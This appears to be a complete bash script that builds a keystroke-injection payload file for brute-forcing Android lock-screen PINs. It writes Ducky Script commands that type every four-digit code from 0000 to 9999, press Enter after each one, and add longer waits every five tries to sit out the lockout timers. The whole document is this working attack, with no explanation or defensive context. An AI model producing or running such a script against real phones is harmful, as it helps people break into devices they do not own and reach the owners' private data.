#!/bin/bash

echo DELAY 5000 > android_brute-force_0000-9999.txt; echo {0000..9999} | xargs -n 1 echo STRING | sed '0~5 s/$/\nWAIT/g' | sed '0~1 s/$/\nDELAY 1000\nENTER\nENTER/g' | sed 's/WAIT/DELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER\nDELAY 5000\nENTER/g' >> android_brute-force_0000-9999.txt
